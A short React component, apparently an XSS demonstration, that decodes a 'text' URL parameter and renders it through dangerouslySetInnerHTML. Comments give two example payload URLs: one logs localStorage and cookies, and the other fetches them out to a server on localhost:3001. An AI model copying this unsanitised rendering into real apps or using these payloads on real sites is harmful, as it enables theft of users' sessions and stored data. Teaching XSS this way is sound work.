import React, { useState } from 'react';
import './App.css';

// http://localhost:3000/?text=<img src onerror="console.log('localstorage & cookie', JSON.stringify(localStorage), JSON.stringify(document.cookie))" />
// http://localhost:3000/?text=<img src onerror="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`).then(data => data.json()).then(data => console.log('server response', data))" />
const dynamicText = decodeURI(document.location.href.substring(document.location.href.indexOf('text=') + 5));

const App = () => {
  const [text, setText] = useState(dynamicText);
  return (
    <div className="App">
      <textarea value={text} onChange={e => setText(e.target.value)} />
      <div dangerouslySetInnerHTML={{ __html: text }} />
    </div>
  );
};

export default App;
